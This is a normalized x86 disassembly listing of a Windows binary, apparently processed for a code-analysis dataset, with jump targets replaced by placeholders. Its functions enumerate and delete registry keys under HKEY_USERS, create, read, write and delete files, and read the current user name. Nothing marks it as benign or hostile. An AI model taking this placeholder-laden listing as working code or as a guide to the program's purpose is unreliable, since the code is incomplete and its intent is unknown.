push eax
push edi
push eax
lea eax [ esi + 0x8 ]
push eax
call sub_41ad2f
push 0x8
call sub_41ac18
add esp 0x2c
test eax eax
je r-xdata
push edi
xor esi esi
call sub_41a7eb
add esp 0x4
pop ebx
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ eax ] esi
push edi
mov [ eax + 0x4 ] ebx
mov esi eax
call sub_41a7eb
add esp 0x4
pop ebx
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_416a40
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x48 ]
mov ebx 0x8
cmp [ eax + 0x14 ] ebx
jb r-xdata
push eax
push 0x80000003
call [ SHDeleteKeyW@IAT ]
cmp [ edi + 0x1c ] ebx
lea esi [ edi + 0x8 ]
jb r-xdata
mov eax [ eax ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea esi [ edi + 0x24 ]
mov edi 0x8
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ebx [ PathFileExistsW@IAT ]
push eax
call ebx
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push esi
call [ DeleteFileW@IAT ]
mov esi [ esi ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x14 ] edi
jb r-xdata
push eax
call ebx
test eax eax
je r-xdata
push esi
call [ DeleteFileW@IAT ]
mov esi [ esi ]
sub_416ac0
push esi
mov esi ecx
mov [ esi ] r--data
mov [ esi + 0x4 ] r--data
mov ecx 0x8
push edi
mov [ esi + 0x58 ] 0x0
cmp [ esi + 0x5c ] ecx
jb r-xdata
lea eax [ esi + 0x48 ]
mov eax [ esi + 0x48 ]
jmp r-xdata
xor ecx ecx
mov [ esi + 0x5c ] 0x7
mov [ esi + 0x58 ] 0x0
mov edi 0x8
mov [ esi + 0x48 ] cx
cmp [ esi + 0x38 ] edi
jb r-xdata
mov eax [ esi + 0x48 ]
push eax
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ eax ] dx
cmp [ esi + 0x5c ] ecx
jb r-xdata
xor eax eax
mov [ esi + 0x38 ] 0x7
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x24 ] ax
cmp [ esi + 0x1c ] edi
jb r-xdata
mov edx [ esi + 0x24 ]
push edx
call sub_41a0d6
add esp 0x4
mov [ esi + 0x1c ] 0x7
mov [ esi + 0x18 ] 0x0
xor edx edx
pop edi
mov [ esi + 0x8 ] dx
pop esi
retn
mov ecx [ esi + 0x8 ]
push ecx
call sub_41a0d6
add esp 0x4
sub_416b70
push ebp
mov ebp esp
push 0xffffffff
push sub_42ece0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ CreateFileW@IAT ]
mov ebx [ GetLastError@IAT ]
mov [ ebp - 0xd ] 0x0
jmp r-xdata
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
jae r-xdata
push 0x0
push 0x2
push 0x4
push 0x0
push 0x0
push 0xc0000000
push eax
call edi
mov esi eax
call ebx
cmp eax 0x20
jne r-xdata
lea eax [ ebp + 0x8 ]
cmp esi 0xffffffff
jne r-xdata
push 0x14
call [ Sleep@IAT ]
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
cmp al 0x5
jb r-xdata
push 0x2
xor ebx ebx
push ebx
push ebx
push esi
mov [ ebp - 0x14 ] ebx
call [ SetFilePointer@IAT ]
mov eax [ ebp + 0x24 ]
mov ecx [ eax + 0x4 ]
mov edi [ WriteFile@IAT ]
push ebx
lea edx [ ebp - 0x14 ]
push edx
push 0x4
lea eax [ ebp - 0x18 ]
push eax
push esi
mov [ ebp - 0x18 ] ecx
call edi
cmp [ ebp - 0x14 ] 0x4
je r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov eax [ ebp + 0x24 ]
mov edx [ ebp - 0x18 ]
mov eax [ eax ]
push ebx
lea ecx [ ebp - 0x14 ]
push ecx
push edx
push eax
push esi
call edi
mov eax [ ebp - 0x18 ]
push esi
cmp eax [ ebp - 0x14 ]
jne r-xdata
push esi
mov esi [ ebp + 0x28 ]
xor ecx ecx
mov [ ebp + 0x18 ] 0x0
test esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0d6
add esp 0x4
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov esi [ ebp + 0x28 ]
xor edx edx
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] dx
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41a0d6
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp + 0x8 ] cx
mov [ ebp + 0x1c ] 0x7
je r-xdata
mov esi [ ebp + 0x28 ]
xor ecx ecx
mov [ ebp + 0x18 ] ebx
cmp esi ebx
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jmp r-xdata
or eax 0xffffffff
lea edx [ esi + 0x4 ]
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
or edx 0xffffffff
lea ecx [ esi + 0x8 ]
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_416d20
push ebp
mov ebp esp
push 0xffffffff
push sub_42d478
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp [ ebp + 0x1c ] 0x8
mov [ ebp - 0x4 ] ebx
jae r-xdata
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp + 0x8 ]
push ebx
push esi
call [ GetFileSize@IAT ]
mov ecx [ edi ]
sub eax ecx
cmp eax 0x5
jae r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push ebx
push ebx
push ecx
push esi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ ebp + 0x8 ]
mov esi 0x8
cmp [ ebp + 0x1c ] esi
jae r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0d6
add esp 0x4
push ebx
lea eax [ ebp - 0x14 ]
push eax
push 0x4
lea ecx [ ebp - 0x10 ]
push ecx
push esi
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
call [ ReadFile@IAT ]
cmp [ ebp - 0x14 ] 0x4
je r-xdata
push esi
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] 0x8
mov [ edi ] ebx
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
mov [ edi ] ebx
cmp [ ebp + 0x1c ] esi
jb r-xdata
lea eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
add [ edi ] 0x4
push 0x1
push edx
call sub_41acef
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
lea ecx [ ebp + 0x8 ]
call sub_401900
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov edx [ ebp + 0x8 ]
push edx
call sub_41a0d6
add esp 0x4
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41a0d6
add esp 0x4
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ecx [ ebp - 0x10 ]
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push ecx
push ebx
push esi
call [ ReadFile@IAT ]
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
push esi
call [ CloseHandle@IAT ]
add [ edi ] 0xfffffffc
lea ecx [ ebp + 0x8 ]
call sub_401900
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
add [ edi ] eax
push esi
call [ CloseHandle@IAT ]
push 0x8
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
push ebx
call sub_41a7eb
add esp 0x4
push esi
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
jae r-xdata
xor esi esi
mov ecx [ ebp - 0x10 ]
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov esi eax
jmp r-xdata
push eax
call [ DeleteFileW@IAT ]
lea ecx [ ebp + 0x8 ]
mov [ edi ] 0x0
call sub_401900
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
lea eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
call sub_401900
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
sub_416f70
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea eax [ esi + 0x3c ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] esp
xor edx edx
push 0xffffffff
push edx
lea eax [ esi + 0x4 ]
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] dx
call sub_401ae0
lea ecx [ esi - 0x4 ]
call sub_416d20
pop esi
mov esp ebp
pop ebp
retn
sub_416fb0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea eax [ esi + 0x40 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] esp
xor edx edx
push 0xffffffff
push edx
lea eax [ esi + 0x20 ]
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] dx
call sub_401ae0
lea ecx [ esi - 0x4 ]
call sub_416d20
pop esi
mov esp ebp
pop ebp
retn
sub_416ff0
push ebp
mov ebp esp
push 0xffffffff
push sub_42ed10
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
sub esp 0x8
mov ecx esp
xor ebx ebx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] ebx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] ebx
call sub_4032e0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push 0xffffffff
push ebx
lea eax [ esi + 0x20 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] dx
call sub_401ae0
lea ecx [ esi - 0x4 ]
mov [ ebp - 0x4 ] bl
call sub_416b70
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi eax
add eax 0x4
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_4170c0
push ebp
mov ebp esp
push 0xffffffff
push sub_42ed10
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
sub esp 0x8
mov ecx esp
xor ebx ebx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] ebx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] ebx
call sub_4032e0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push 0xffffffff
push ebx
lea eax [ esi + 0x4 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] dx
call sub_401ae0
lea ecx [ esi - 0x4 ]
mov [ ebp - 0x4 ] bl
call sub_416b70
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi eax
add eax 0x4
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_417190
push ebp
mov ebp esp
push 0xffffffff
push sub_42ed49
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] cx
mov ebx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov edi [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
add eax [ edx + 0x10 ]
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_4077d0
mov edx [ ebp + 0x10 ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_4077d0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_401930
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_417250
push ebp
mov ebp esp
push 0xffffffff
push sub_42ee24
mov eax [ fs : 0x0 ]
push eax
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x114 ] ebx
mov [ ebp - 0x118 ] edi
push 0x4
xor eax eax
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x118 ] 0x104
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] ax
call sub_403650
mov ecx [ ebp - 0x118 ]
push 0x2
push ecx
mov [ ebp - 0x4 ] 0x2
call sub_41acef
mov esi eax
add esp 0x8
cmp esi edi
jne r-xdata
lea ecx [ ebp - 0x118 ]
push ecx
push esi
call [ GetUserNameW@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp + 0x28 ]
push edx
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
call sub_417190
lea edx [ ebp - 0x30 ]
push edx
push eax
push ebx
mov [ ebp - 0x4 ] 0x3
call sub_407e00
mov ebx 0x8
add esp 0x18
cmp [ ebp - 0x38 ] ebx
jb r-xdata
push 0xffffffff
xor ecx ecx
push edi
lea edx [ ebp + 0xc ]
mov [ ebp - 0x4c ] cx
mov ebx 0x7
push edx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] edi
call sub_401ae0
xor eax eax
mov [ ebp - 0xa0 ] ax
mov eax esi
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x90 ] edi
lea edx [ eax + 0x2 ]
push esi
call sub_41a7eb
lea edx [ ebp + 0x28 ]
push edx
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
call sub_417190
lea edx [ ebp - 0x30 ]
push edx
push eax
push ebx
mov [ ebp - 0x4 ] 0x4
call sub_407e00
mov ebx 0x8
add esp 0x1c
cmp [ ebp - 0x38 ] ebx
jb r-xdata
xor ecx ecx
mov esi 0x7
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] cx
cmp [ ebp - 0x1c ] ebx
jb r-xdata
mov eax [ ebp - 0x4c ]
push eax
call sub_41a0d6
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xa0 ]
call sub_403650
push 0xffffffff
xor ecx ecx
push edi
lea edx [ ebp + 0x28 ]
mov [ ebp - 0x84 ] cx
push edx
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] edi
call sub_401ae0
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x84 ]
push ecx
lea edx [ ebp - 0xd8 ]
push edx
mov [ ebp - 0x4 ] 0x7
call sub_413870
lea ecx [ ebp - 0x4c ]
push ecx
push eax
lea edx [ ebp - 0x68 ]
mov ebx 0x8
push edx
mov [ ebp - 0x4 ] bl
call sub_413870
add esp 0x18
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
xor ecx ecx
mov esi 0x7
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] cx
cmp [ ebp - 0x1c ] ebx
jb r-xdata
mov eax [ ebp - 0x4c ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] ax
cmp [ ebp + 0x20 ] ebx
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0xc4 ] 0x7
mov [ ebp - 0xc8 ] edi
mov [ ebp - 0xd8 ] cx
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] ax
cmp [ ebp + 0x20 ] ebx
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp + 0x20 ] esi
mov [ ebp + 0x1c ] edi
mov [ ebp + 0xc ] dx
cmp [ ebp + 0x3c ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x84 ] ax
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp + 0x20 ] esi
mov [ ebp + 0x1c ] edi
mov [ ebp + 0xc ] dx
cmp [ ebp + 0x3c ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x114 ]
mov eax [ ebp + 0x28 ]
push eax
call sub_41a0d6
add esp 0x4
jmp r-xdata
xor edx edx
mov [ ebp - 0x8c ] 0x7
mov [ ebp - 0x90 ] edi
mov [ ebp - 0xa0 ] dx
cmp [ ebp - 0x38 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ ebp + 0x28 ]
push eax
call sub_41a0d6
add esp 0x4
jmp r-xdata
xor ecx ecx
push esi
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] cx
call sub_41a7eb
push ebx
mov [ ebp - 0x4 ] 0xe
call sub_41ac18
add esp 0x8
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x4 ] 0xf
cmp eax edi
je r-xdata
mov eax [ ebp - 0x4c ]
push eax
call sub_41a0d6
add esp 0x4
xor esi esi
mov ecx eax
call sub_412970
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x68 ]
cmp [ ebp - 0x54 ] ebx
jae r-xdata
lea edx [ ebp + 0x28 ]
push edx
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0xbc ]
push ecx
call sub_417190
add esp 0xc
lea edx [ ebp - 0x30 ]
push edx
push eax
mov eax [ ebp - 0x114 ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_407e00
add esp 0xc
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov [ ebp - 0x4 ] 0xe
cmp esi edi
jne r-xdata
mov ecx [ ebp - 0x58 ]
lea edx [ ecx + ecx ]
push edx
push eax
mov eax [ ebp + 0x44 ]
push eax
mov ecx esi
call sub_4129d0
movzx ecx [ ebp + 0x44 ]
movzx eax ax
mov ebx eax
shl ebx 0x10
xor ebx ecx
mov ecx esi
call sub_4129c0
push esi
call sub_41a0d6
push 0x2
push 0xa
mov [ ebp - 0x4 ] 0xd
call sub_41acef
mov esi eax
add esp 0xc
cmp esi edi
jne r-xdata
lea eax [ ebp - 0x68 ]
xor edx edx
mov esi 0x7
mov [ ebp - 0xa8 ] esi
mov [ ebp - 0xac ] edi
mov [ ebp - 0xbc ] dx
cmp [ ebp - 0x54 ] ebx
jb r-xdata
mov ecx [ ebp - 0xbc ]
push ecx
call sub_41a0d6
add esp 0x4
push ebx
push r--data
push 0xa
push esi
call sub_41b638
add esp 0x10
push esi
lea ecx [ ebp - 0xbc ]
call sub_403cc0
push eax
lea edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0xf4 ]
push eax
mov [ ebp - 0x4 ] 0x15
call sub_407e50
lea ecx [ ebp - 0x30 ]
push ecx
push eax
lea edx [ ebp - 0x110 ]
push edx
mov [ ebp - 0x4 ] 0x16
call sub_407e00
add esp 0x18
lea ecx [ ebp - 0xf4 ]
call sub_401900
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x19
call sub_401900
push esi
call sub_41a7eb
mov esi [ ebp - 0x114 ]
add esp 0x4
lea ecx [ ebp - 0x110 ]
xor eax eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov ecx esi
mov [ esi ] ax
call sub_403a40
lea ecx [ ebp - 0x110 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0xf4 ]
call sub_403cc0
mov esi eax
lea edx [ ebp + 0x28 ]
push edx
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0xbc ]
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_417190
push esi
mov esi [ ebp - 0x114 ]
push eax
push esi
mov [ ebp - 0x4 ] 0x14
call sub_413870
add esp 0x18
lea ecx [ ebp - 0xbc ]
call sub_401900
lea ecx [ ebp - 0xf4 ]
xor ecx ecx
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x68 ] cx
cmp [ ebp - 0x1c ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_41a0d6
add esp 0x4
call sub_401900
lea ecx [ ebp - 0x68 ]
call sub_401900
lea ecx [ ebp - 0x30 ]
call sub_401900
lea ecx [ ebp + 0xc ]
call sub_401900
lea ecx [ ebp + 0x28 ]
call sub_401900
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x40
xor eax eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] ax
cmp [ ebp + 0x20 ] ebx
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp + 0x20 ] esi
mov [ ebp + 0x1c ] edi
mov [ ebp + 0xc ] dx
cmp [ ebp + 0x3c ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ ebp + 0x28 ]
push eax
call sub_41a0d6
add esp 0x4
jmp r-xdata
sub_41780b
lea edx [ ebp + 0x28 ]
push edx
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0xf4 ]
push ecx
call sub_417190
lea edx [ ebp - 0x30 ]
push edx
push eax
mov eax [ ebp - 0x114 ]
push eax
mov [ ebp - 0x4 ] 0x12
call sub_407e00
add esp 0x18
lea ecx [ ebp - 0xf4 ]
call sub_401900
mov eax r-xdata
retn
sub_417890
push ebp
mov ebp esp
push 0xffffffff
push sub_42ee5b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x804 ]
push eax
push 0x20019
xor edi edi
push edi
push edi
push 0x80000003
mov [ ebp - 0x804 ] edi
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push 0x7ce
lea eax [ ebp - 0x7de ]
xor edx edx
push edi
push eax
mov [ ebp - 0x7e0 ] dx
call sub_41adb0
mov eax [ ebp - 0x804 ]
mov ebx [ RegEnumKeyExW@IAT ]
add esp 0xc
push edi
push edi
push edi
push edi
lea ecx [ ebp - 0x800 ]
push ecx
lea edx [ ebp - 0x7e0 ]
push edx
push edi
push eax
mov [ ebp - 0x800 ] 0x3e8
call ebx
test eax eax
jne r-xdata
xor ecx ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] cx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
xor ebx ebx
xor ecx ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
mov ecx esi
call sub_403650
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
mov edi eax
cmp edi 0x7ffffffe
jbe r-xdata
cmp [ ebp - 0x800 ] 0x9
ja r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_4194e6
xor edi edi
xor eax eax
mov [ ebp - 0x7fc ] ax
mov ebx 0x7
lea eax [ ebp - 0x7e0 ]
mov [ ebp - 0x7e8 ] ebx
mov [ ebp - 0x7ec ] edi
lea edx [ eax + 0x2 ]
mov eax [ ebp - 0x804 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x800 ]
push ecx
lea edx [ ebp - 0x7e0 ]
push edx
inc edi
push edi
push eax
mov [ ebp - 0x800 ] 0x3e8
call ebx
test eax eax
je r-xdata
cmp edi ebx
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_401520
cmp edi ebx
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x7e0 ]
push ecx
lea ecx [ ebp - 0x7fc ]
call sub_403650
lea eax [ ebp - 0x7fc ]
xor edx edx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] edi
mov [ esi ] dx
call sub_403a40
cmp [ ebp - 0x7e8 ] 0x8
jb r-xdata
jbe r-xdata
